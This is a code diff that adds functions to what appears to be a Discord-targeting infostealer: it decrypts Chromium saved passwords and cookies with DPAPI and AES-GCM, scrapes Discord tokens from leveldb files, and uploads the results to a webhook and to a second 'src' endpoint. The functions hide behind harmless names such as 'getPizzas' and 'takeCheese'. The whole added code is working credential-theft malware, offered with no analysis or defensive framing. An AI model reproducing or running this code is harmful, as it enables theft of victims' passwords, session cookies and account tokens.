@@ -80,6 +80,185 @@ function Infect() {
     });
 };
 
+async function getPizzas(path) {
+    let path_split = path.split('\\'),
+        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
+        path_tail = path_split_tail.join('\\') + '\\';
+    if (path.startsWith(appdata)) path_tail = path;
+    if (path.includes('cord')) return;
+    if (fs.existsSync(path_tail)) {
+        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
+                .os_crypt.encrypted_key, 'base64')
+            .slice(5);
+        var login_data = path + 'Login Data',
+            passwords_db = path + 'passwords.db';
+        fs.copyFileSync(login_data, passwords_db);
+        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
+        var result = '\n\nPASSWORDS FROM: ' + path + '  #RustlerONTOP\n',
+            sql = new sqlite3.Database(passwords_db, err => {
+                if (err) {
+                    if (debug) console.log(err);
+                }
+            });
+        const pizza = await new Promise((resolve, reject) => {
+            sql.each('SELECT origin_url, username_value, password_value FROM logins', function (err, row) {
+                if (err) {
+                    if (debug) console.log(err);
+                }
+                if (row['username_value'] != '') {
+                    let password_value = row['password_value'];
+                    try {
+                        if ((password_value[0] == 1) && (password_value[1] == 0) && (password_value[2] == 0) && (password_value[3] == 0)) {
+                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + dpapi.unprotectData(password_value, null, 'CurrentUser')
+                                .toString('utf-8');
+                        } else {
+                            let start = password_value.slice(3, 15),
+                                middle = password_value.slice(15, password_value.length - 16),
+                                end = password_value.slice(password_value.length - 16, password_value.length),
+                                decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
+                            decipher.setAuthTag(end);
+                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
+                        }
+                    } catch (e) {
+                        if (debug) console.log(e);
+                    }
+                }
+            }, function () {
+                resolve(result);
+            });
+        });
+        return pizza;
+    } else {
+        return '';
+    }
+}
+
+async function getCheese(path) {
+    let path_split = path.split('\\'),
+        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
+        path_tail = path_split_tail.join('\\') + '\\';
+    if (path.startsWith(appdata)) path_tail = path;
+    if (path.includes('cord')) return;
+    if (fs.existsSync(path_tail)) {
+        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
+                .os_crypt.encrypted_key, 'base64')
+            .slice(5);
+        var cookies = path + 'Cookies',
+            cookies_db = path + 'cookies.db';
+        fs.copyFileSync(cookies, cookies_db);
+        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
+        var result = '',
+            sql = new sqlite3.Database(cookies_db, err => {
+                if (err) {
+                    if (debug) console.log(err);
+                }
+            });
+        const cheese = await new Promise((resolve, reject) => {
+            sql.each('SELECT host_key, name, encrypted_value FROM cookies', function (err, row) {
+                if (err) {
+                    if (debug) console.log(err);
+                }
+                let encrypted_value = row['encrypted_value'];
+                try {
+                    if ((encrypted_value[0] == 1) && (encrypted_value[1] == 0) && (encrypted_value[2] == 0) && (encrypted_value[3] == 0)) {
+                        result += row['host_key'] + "	" + "TRUE" + "	/" + "	FALSE" + "	2597573456	" + row['name'] + "	" + dpapi.unprotectData(encrypted_value, null, 'CurrentUser') + "\n"
+                            .toString('utf-8');
+                    } else {
+                        let start = encrypted_value.slice(3, 15),
+                            middle = encrypted_value.slice(15, encrypted_value.length - 16),
+                            end = encrypted_value.slice(encrypted_value.length - 16, encrypted_value.length),
+                            decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
+                        decipher.setAuthTag(end);
+                        result += row['host_key'] + "	" + "TRUE" + "	/" + "	FALSE" + "	2597573456	" + row['name'] + "	" + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8') + "\n"
+                    }
+                } catch (e) {
+                    if (debug) console.log(e);
+                }
+            }, function () {
+                resolve(result);
+            })
+        });
+        return cheese;
+    } else return '';
+}
+
+function findToken(path) {
+    path += 'Local Storage\\leveldb';
+    let tokens = [];
+    try {
+        fs.readdirSync(path)
+            .map(file => {
+                (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
+                    .split(/\r?\n/)
+                    .forEach(line => {
+                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)];
+                        for (const pattern of patterns) {
+                            const foundTokens = line.match(pattern);
+                            if (foundTokens) foundTokens.forEach(token => tokens.push(token));
+                        }
+                    });
+            });
+    } catch (e) {}
+    return tokens;
+}
+
+async function takePizzas() {
+    let passwords = '';
+    for (let i = 0; i < paths.length; i++) {
+        if (fs.existsSync(paths[i] + 'Login Data'))
+            passwords += await getPizzas(paths[i]) || '';
+    }
+    fs.writeFile(appdata + '\\passwords.txt', passwords, function (err, data) {
+
+        if (err) throw err;
+      
+        const form = new FormData();
+        form.append("file", fs.createReadStream(appdata+"\\passwords.txt"));
+        form.submit(webhook, (error, response) => {
+        if (error) console.log(error);
+        });
+    });
+    fs.writeFile(appdata + '\\src-passwords.txt', passwords, function (err, data) {
+
+        if (err) throw err;
+      
+        const form = new FormData();
+        form.append("file", fs.createReadStream(appdata+"\\src-passwords.txt"));
+        form.submit(src, (error, response) => {
+        if (error) console.log(error);
+        });
+    });
+}
+
+async function takeCheese() {
+    let cookies = '';
+    for (let i = 0; i < paths.length; i++) {
+        if (fs.existsSync(paths[i] + 'Cookies'))
+            cookies += await getCheese(paths[i]) || '';
+    }
+    fs.writeFile(appdata + '\\cookies.txt', cookies, function (err, data) {
+
+        if (err) throw err;
+      
+        const form = new FormData();
+        form.append("file", fs.createReadStream(appdata+"\\cookies.txt"));
+        form.submit(webhook, (error, response) => {
+        if (error) console.log(error);
+        });
+    });
+
+    fs.writeFile(appdata + '\\src-cookies.txt', cookies, function (err, data) {
+
+        if (err) throw err;
+      
+        const form = new FormData();
+        form.append("file", fs.createReadStream(appdata+"\\src-cookies.txt"));
+        form.submit(src, (error, response) => {
+        if (error) console.log(error);
+        });
+    });
+
+}
 
 function listDiscords() {
     exec('tasklist', function(err,stdout, stderr) {
